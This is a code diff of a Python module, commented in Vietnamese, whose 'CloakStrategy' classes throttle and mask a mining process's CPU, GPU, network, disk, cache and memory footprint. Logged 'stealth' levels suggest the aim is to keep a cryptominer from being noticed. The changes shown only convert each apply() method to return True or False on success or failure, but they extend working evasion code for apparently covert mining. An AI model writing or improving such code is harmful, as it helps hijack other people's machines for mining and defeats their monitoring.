@@ -118,12 +118,12 @@ class CloakStrategy(ABC):
             self.logger.debug(f"Injected privileged_manager into {self.__class__.__name__}")
 
     @abstractmethod
-    def apply(self, process: MiningProcess) -> None:
+    def apply(self, process: MiningProcess) -> bool:
         """
-        Áp dụng chiến lược cloaking cho tiến trình (đồng bộ).
+        ✅ ENHANCED: Áp dụng chiến lược cloaking cho tiến trình với return value validation.
 
         :param process: Đối tượng MiningProcess.
-        :return: None
+        :return: bool - True nếu strategy áp dụng thành công, False nếu thất bại
         """
         pass
 
@@ -786,11 +786,12 @@ class CpuCloakStrategy(CloakStrategy):
         self.logger.info(f"🎯 [CPU Strategy] Pre-configured for {process_type} process type")
         self.logger.debug(f"🔧 [CPU Strategy] Config: {self.process_type_config}")
 
-    def apply(self, process: MiningProcess) -> None:
+    def apply(self, process: MiningProcess) -> bool:
         """
-        ✅ ENHANCED: Áp dụng CPU cloaking với metadata-aware optimization.
+        ✅ ENHANCED: Áp dụng CPU cloaking với metadata-aware optimization và return validation.
         
         :param process: Enhanced MiningProcess với classification metadata.
+        :return: bool - True nếu CPU cloaking áp dụng thành công, False nếu thất bại
         """
         try:
             pid, name = process.pid, process.name
@@ -935,12 +936,13 @@ class CpuCloakStrategy(CloakStrategy):
             # ✅ ENHANCED: Success completion logging
             cloak_logger.info(f"✅ [CPU Strategy] Successfully applied CPU cloaking to {name} (PID={pid})")
             cloak_logger.info(f"📊 [CPU Strategy] Final state - optimization: {optimization_level}, stealth: {stealth_level}")
+            return True  # ✅ SUCCESS: CPU cloaking completed successfully
             
         except Exception as e:
             cloak_logger.error(f"❌ [CPU Strategy] Failed applying CPU cloaking to PID={process.pid}: {e}")
             cloak_logger.error(f"🔍 [CPU Strategy] Error details: {traceback.format_exc()}")
             self.logger.error(f"[CPU Cloaking] Lỗi apply() cho PID={process.pid}: {e}")
-            raise
+            return False  # ✅ FAILURE: CPU cloaking failed
 
     def _verify_cgroup_settings_safe(self, base_cgroup_name: str, pid: int) -> bool:
         """
@@ -1333,13 +1335,14 @@ class GpuCloakStrategy(CloakStrategy):
         )
         time.sleep(random_sleep_sec)
         
-    def apply(self, process: MiningProcess) -> None:
+    def apply(self, process: MiningProcess) -> bool:
         """
-        ✅ UNIFIED: Comprehensive GPU cloaking với integrated thermal management.
+        ✅ UNIFIED: Comprehensive GPU cloaking với integrated thermal management và return validation.
         
         Combines GPU performance control và thermal protection trong single strategy.
         
         :param process: Đối tượng MiningProcess.
+        :return: bool - True nếu GPU cloaking áp dụng thành công, False nếu thất bại
         """
         try:
             pid, name = process.pid, process.name
@@ -1393,15 +1396,19 @@ class GpuCloakStrategy(CloakStrategy):
                 self._apply_integrated_thermal_management(pid, gpu_count)
             
             self.logger.info(f"✅ [Unified GPU Cloaking] Applied comprehensive GPU control for {name}(PID={pid})")
+            return True  # ✅ SUCCESS: GPU cloaking completed successfully
 
         except psutil.NoSuchProcess as e:
             self.logger.error(f"GPU Cloaking: Tiến trình không tồn tại: {e}")
+            return False  # ✅ FAILURE: Process does not exist
         except psutil.AccessDenied as e:
             self.logger.error(f"GPU Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
+            return False  # ✅ FAILURE: Access denied
         except Exception as e:
             self.logger.error(
                 f"Lỗi cloaking GPU cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
             )
+            return False  # ✅ FAILURE: GPU cloaking failed
             
     def _apply_integrated_thermal_management(self, pid: int, gpu_count: int) -> None:
         """
@@ -1525,11 +1532,12 @@ class NetworkCloakStrategy(CloakStrategy):
         self.network_interface = config.get('network_interface') or "eth0"
         self.process_marks: Dict[int, int] = {}
 
-    def apply(self, process: MiningProcess) -> None:
+    def apply(self, process: MiningProcess) -> bool:
         """
-        Áp dụng cloaking mạng (đồng bộ).
+        ✅ ENHANCED: Áp dụng network cloaking với return value validation.
         
         :param process: Đối tượng MiningProcess.
+        :return: bool - True nếu network cloaking áp dụng thành công, False nếu thất bại
         """
         try:
             pid, name = process.pid, process.name
@@ -1538,31 +1546,33 @@ class NetworkCloakStrategy(CloakStrategy):
             ok_mark = self.network_resource_manager.mark_packets(pid, mark)
             if not ok_mark:
                 self.logger.error(f"[Net Cloaking] Không thể MARK iptables cho PID={pid}.")
-                return
+                return False  # ✅ FAILURE: Cannot mark packets
 
             ok_limit = self.network_resource_manager.limit_bandwidth(
                 self.network_interface, mark, self.bandwidth_reduction_mbps
             )
             if not ok_limit:
                 self.logger.error(f"[Net Cloaking] Giới hạn băng thông thất bại (iface={self.network_interface}).")
-                return
+                return False  # ✅ FAILURE: Cannot limit bandwidth
 
             self.process_marks[pid] = mark
             self.logger.info(f"[Net Cloaking] Limit={self.bandwidth_reduction_mbps}Mbps cho PID={pid}, iface={self.network_interface}.")
 
             # Rollback mark_packets
             self.network_resource_manager.unmark_packets(pid, mark)
-            return
+            return True  # ✅ SUCCESS: Network cloaking applied successfully
 
         except psutil.NoSuchProcess as e:
             self.logger.error(f"Net Cloaking: Tiến trình không tồn tại: {e}")
+            return False  # ✅ FAILURE: Process does not exist
         except psutil.AccessDenied as e:
             self.logger.error(f"Net Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
+            return False  # ✅ FAILURE: Access denied
         except Exception as e:
             self.logger.error(
                 f"Lỗi cloaking mạng cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
             )
-            raise
+            return False  # ✅ FAILURE: Network cloaking failed
 
     def restore(self, process: MiningProcess) -> None:
         """
@@ -1605,28 +1615,33 @@ class DiskIoCloakStrategy(CloakStrategy):
             self.logger.warning(f"io_weight không hợp lệ: {self.io_weight}. Mặc định=3.")
             self.io_weight = 3
 
-    def apply(self, process: MiningProcess) -> None:
+    def apply(self, process: MiningProcess) -> bool:
         """
-        Áp dụng cloaking Disk I/O (đồng bộ).
+        ✅ ENHANCED: Áp dụng Disk I/O cloaking với return value validation.
 
         :param process: Đối tượng MiningProcess.
+        :return: bool - True nếu Disk I/O cloaking áp dụng thành công, False nếu thất bại
         """
         try:
             pid, name = process.pid, process.name
             ok = self.disk_io_resource_manager.set_io_weight(pid, self.io_weight)
             if ok:
                 self.logger.info(f"[DiskIO Cloaking] PID={pid}, io_weight={self.io_weight}.")
+                return True  # ✅ SUCCESS: Disk I/O cloaking applied successfully
             else:
                 self.logger.error(f"[DiskIO Cloaking] Không thể set io_weight cho PID={pid}.")
+                return False  # ✅ FAILURE: Cannot set I/O weight
         except psutil.NoSuchProcess as e:
             self.logger.error(f"DiskIO Cloaking: Tiến trình không tồn tại: {e}")
+            return False  # ✅ FAILURE: Process does not exist
         except psutil.AccessDenied as e:
             self.logger.error(f"DiskIO Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
+            return False  # ✅ FAILURE: Access denied
         except Exception as e:
             self.logger.error(
                 f"Lỗi DiskIO Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
             )
-            raise
+            return False  # ✅ FAILURE: Disk I/O cloaking failed
 
     def restore(self, process: MiningProcess) -> None:
         """
@@ -1671,28 +1686,33 @@ class CacheCloakStrategy(CloakStrategy):
             self.logger.warning(f"cache_limit_percent={self.cache_limit_percent} không hợp lệ, mặc định=50%.")
             self.cache_limit_percent = 50
 
-    def apply(self, process: MiningProcess) -> None:
+    def apply(self, process: MiningProcess) -> bool:
         """
-        Áp dụng cloaking Cache (đồng bộ).
+        ✅ ENHANCED: Áp dụng Cache cloaking với return value validation.
 
         :param process: Đối tượng MiningProcess.
+        :return: bool - True nếu Cache cloaking áp dụng thành công, False nếu thất bại
         """
         try:
             pid, name = process.pid, process.name
             ok = self.cache_resource_manager.set_cache_limit(pid, self.cache_limit_percent)
             if ok:
                 self.logger.info(f"[Cache Cloaking] PID={pid}, cache_limit={self.cache_limit_percent}%.")
+                return True  # ✅ SUCCESS: Cache cloaking applied successfully
             else:
                 self.logger.error(f"[Cache Cloaking] Không thể set cache_limit cho PID={pid}.")
+                return False  # ✅ FAILURE: Cannot set cache limit
         except psutil.NoSuchProcess as e:
             self.logger.error(f"Cache Cloaking: Tiến trình không tồn tại: {e}")
+            return False  # ✅ FAILURE: Process does not exist
         except psutil.AccessDenied as e:
             self.logger.error(f"Cache Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
+            return False  # ✅ FAILURE: Access denied
         except Exception as e:
             self.logger.error(
                 f"Lỗi Cache Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
             )
-            raise
+            return False  # ✅ FAILURE: Cache cloaking failed
 
     def restore(self, process: MiningProcess) -> None:
         """
@@ -1739,35 +1759,41 @@ class MemoryCloakStrategy(CloakStrategy):
             self.logger.warning(f"memory_limit_mb={self.memory_limit_mb} không hợp lệ, mặc định=2048.")
             self.memory_limit_mb = 2048
 
-    def apply(self, process: MiningProcess) -> None:
+    def apply(self, process: MiningProcess) -> bool:
         """
-        Áp dụng cloaking Memory (đồng bộ).
+        ✅ ENHANCED: Áp dụng Memory cloaking với return value validation.
 
         :param process: Đối tượng MiningProcess.
+        :return: bool - True nếu Memory cloaking áp dụng thành công, False nếu thất bại
         """
         try:
             pid, name = process.pid, process.name
 
             ok_mem = self.memory_resource_manager.set_memory_limit(pid, self.memory_limit_mb)
-            if ok_mem:
-                self.logger.info(f"[Memory Cloaking] PID={pid}, memory_limit={self.memory_limit_mb}MB.")
-            else:
+            if not ok_mem:
                 self.logger.error(f"[Memory Cloaking] Không thể set memory_limit cho PID={pid}.")
+                return False  # ✅ FAILURE: Cannot set memory limit
+            
+            self.logger.info(f"[Memory Cloaking] PID={pid}, memory_limit={self.memory_limit_mb}MB.")
 
             # Cũng có thể drop cache (nếu muốn)
             ok_cache = self.cache_resource_manager.drop_caches()
             if ok_cache:
                 self.logger.info(f"[Memory Cloaking] Đã drop caches cho PID={pid}.")
+            
+            return True  # ✅ SUCCESS: Memory cloaking applied successfully
 
         except psutil.NoSuchProcess as e:
             self.logger.error(f"Memory Cloaking: Tiến trình không tồn tại: {e}")
+            return False  # ✅ FAILURE: Process does not exist
         except psutil.AccessDenied as e:
             self.logger.error(f"Memory Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
+            return False  # ✅ FAILURE: Access denied
         except Exception as e:
             self.logger.error(
                 f"Lỗi Memory Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
             )
-            raise
+            return False  # ✅ FAILURE: Memory cloaking failed
 
     def restore(self, process: MiningProcess) -> None:
         """
